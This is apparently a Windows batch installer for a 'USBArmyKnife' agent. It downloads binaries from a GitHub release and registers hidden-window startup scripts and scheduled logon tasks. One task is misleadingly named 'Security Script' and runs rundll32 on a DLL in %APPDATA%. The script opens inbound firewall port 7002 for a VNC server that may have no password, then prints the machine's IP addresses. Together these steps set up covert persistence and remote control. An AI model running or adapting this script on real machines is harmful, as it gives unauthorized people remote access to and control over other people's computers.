@echo off
setlocal EnableExtensions
title USBArmyKnife Installer

REM ============================================================
REM  USBArmyKnife Installer
REM  Downloads all files from GitHub, installs to C:\AgentInstall,
REM  sets up autostart and firewall, then cleans up temp files.
REM ============================================================

set "DEST=C:\AgentInstall"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "REPO=Korbi0312/USBArmyKnife-modded"
set "RELEASE=v1.1.8-pre"
set "BASE=https://github.com/%REPO%/releases/download/%RELEASE%"
set "TEMP=%TEMP%\USBArmyKnife"

REM --- Elevation check ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Administrator privileges required...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo.
echo ========================================
echo   USBArmyKnife Installer
echo ========================================
echo.

REM --- Password prompt ---
echo VNC Password (optional):
echo    Press Enter for no password.
echo.
set "VNCPASSWD="
set /p "VNCPASSWD=Password: "
if defined VNCPASSWD (
    echo    Password set.
) else (
    echo    No password.
)
echo.

REM --- 1. Stop running processes ---
echo [1/6] Stopping running processes...
taskkill /F /IM AgentLauncher.exe >nul 2>&1
taskkill /F /IM VncDirect.exe >nul 2>&1
timeout /t 1 /nobreak >nul

REM --- 2. Download files from GitHub ---
echo [2/6] Downloading files from GitHub...
if not exist "%TEMP%" mkdir "%TEMP%"
if not exist "%TEMP%\VncDirect" mkdir "%TEMP%\VncDirect"

echo    Downloading AgentLauncher.exe...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%TEMP%\AgentLauncher.exe' -UseBasicParsing" >nul 2>&1
if not exist "%TEMP%\AgentLauncher.exe" (
    echo    [!] FAILED to download AgentLauncher.exe
    echo    Check your internet connection and try again.
    pause
    exit /b 1
)

echo    Downloading DLLs...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/PortableApp.dll' -OutFile '%TEMP%\PortableApp.dll' -UseBasicParsing" >nul 2>&1
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/turbojpeg.dll' -OutFile '%TEMP%\turbojpeg.dll' -UseBasicParsing" >nul 2>&1
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/vcruntime140.dll' -OutFile '%TEMP%\vcruntime140.dll' -UseBasicParsing" >nul 2>&1
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/WmiLight.Native.dll' -OutFile '%TEMP%\WmiLight.Native.dll' -UseBasicParsing" >nul 2>&1

echo    Downloading VNC Server...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/VncDirect.zip' -OutFile '%TEMP%\VncDirect.zip' -UseBasicParsing" >nul 2>&1
if exist "%TEMP%\VncDirect.zip" (
    powershell -NoProfile -Command "Expand-Archive -Path '%TEMP%\VncDirect.zip' -DestinationPath '%TEMP%\VncDirect' -Force" >nul 2>&1
)

echo    Downloads complete.

REM --- 3. Copy files ---
echo [3/6] Installing to %DEST%...
if not exist "%DEST%" mkdir "%DEST%"
if not exist "%DEST%\VncDirect" mkdir "%DEST%\VncDirect"

copy /y "%TEMP%\AgentLauncher.exe" "%DEST%\" >nul
copy /y "%TEMP%\PortableApp.dll" "%DEST%\" >nul
copy /y "%TEMP%\turbojpeg.dll" "%DEST%\" >nul
copy /y "%TEMP%\vcruntime140.dll" "%DEST%\" >nul
copy /y "%TEMP%\WmiLight.Native.dll" "%DEST%\" >nul

if exist "%TEMP%\VncDirect\VncDirect.exe" (
    copy /y "%TEMP%\VncDirect\VncDirect.exe" "%DEST%\VncDirect\" >nul
    copy /y "%TEMP%\VncDirect\VncDirect.dll" "%DEST%\VncDirect\" >nul
)
if exist "%TEMP%\VncDirect\vnc" (
    xcopy /q /y /e "%TEMP%\VncDirect\vnc" "%DEST%\VncDirect\vnc\" >nul
)

REM --- Save password ---
if not "%VNCPASSWD%"=="" (
    echo [+] Saving password...
    powershell -NoProfile -Command "$j = @{}; if (Test-Path '%DEST%\VncDirect\vnc-settings.json') { $j = Get-Content '%DEST%\VncDirect\vnc-settings.json' -Raw | ConvertFrom-Json -AsHashtable }; $j['password'] = '%VNCPASSWD%'; $j | ConvertTo-Json | Set-Content '%DEST%\VncDirect\vnc-settings.json' -Encoding UTF8"
)

REM --- 4. Set up autostart ---
echo [4/6] Setting up autostart...
if not exist "%STARTUP%" mkdir "%STARTUP%"

REM Generate VBS files with PowerShell (avoids encoding issues)
powershell -NoProfile -Command ^
  "$vbs1 = 'Set fso = CreateObject(\"Scripting.FileSystemObject\")' + [char]13 + [char]10 + 'exe = \"C:\AgentInstall\VncDirect\VncDirect.exe\"' + [char]13 + [char]10 + 'If fso.FileExists(exe) Then' + [char]13 + [char]10 + '    CreateObject(\"WScript.Shell\").Run \"\"\"\"  & exe & \"\"\"\" & \" port=7002 cwd=C:\AgentInstall\VncDirect\vnc fps=240 scale=0\", 0, False' + [char]13 + [char]10 + 'End If'; " ^
  "Set-Content -Path '%STARTUP%\VncDirect.vbs' -Value $vbs1 -Encoding ASCII; " ^
  "$vbs2 = 'Set fso = CreateObject(\"Scripting.FileSystemObject\")' + [char]13 + [char]10 + 'exe = \"C:\AgentInstall\AgentLauncher.exe\"' + [char]13 + [char]10 + 'If fso.FileExists(exe) Then' + [char]13 + [char]10 + '    CreateObject(\"WScript.Shell\").Run \"\"\"\"  & exe & \"\"\"\" & \" vid=cafe pid=403f cwd=C:\AgentInstall\", 0, False' + [char]13 + [char]10 + 'End If'; " ^
  "Set-Content -Path '%STARTUP%\USBArmyKnifeAgent.vbs' -Value $vbs2 -Encoding ASCII"

schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "USBArmyKnife Agent" /tr "\"%DEST%\AgentLauncher.exe\" vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "USBArmyKnife Agent" created.
)

schtasks /query /tn "Security Script" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "Security Script" /tr "rundll32 \"%APPDATA%\PortableApp.dll\" Open32 vid=cafe pid=403f cwd=%APPDATA%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "Security Script" created.
)

REM --- 5. Firewall rule ---
echo [5/6] Setting up firewall rule...
netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
if %errorlevel% neq 0 (
    netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul
    echo     Firewall rule created.
)

REM --- 6. Start services ---
echo [6/6] Starting Agent and VNC Server...
start "" "%DEST%\VncDirect\VncDirect.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=240 scale=0
start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%

REM Wait for port
set /a tries=0
:checkport
set /a tries+=1
powershell -NoProfile -Command "if (Get-NetTCPConnection -LocalPort 7002 -State Listen -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }" >nul 2>&1
if not %errorlevel% equ 0 (
    if %tries% lss 10 (
        timeout /t 1 /nobreak >nul
        goto checkport
    )
)
if %tries% lss 10 (
    echo     VNC Server listening on port 7002.
)

REM --- Cleanup temp files ---
echo.
echo Cleaning up downloaded files...
rmdir /s /q "%TEMP%" >nul 2>&1

echo.
echo ========================================
echo   Installation complete!
echo ========================================
echo.
echo PC Name:   %COMPUTERNAME%
echo IP Addresses:
for /f "usebackq tokens=2 delims=:" %%i in (`ipconfig ^| findstr /r "IPv4"`) do echo     %%i
echo.
if not "%VNCPASSWD%"=="" (
    echo VNC Password: %VNCPASSWD%
    echo.
)
echo Window closes in 10 seconds...
timeout /t 10 /nobreak >nul
endlocal
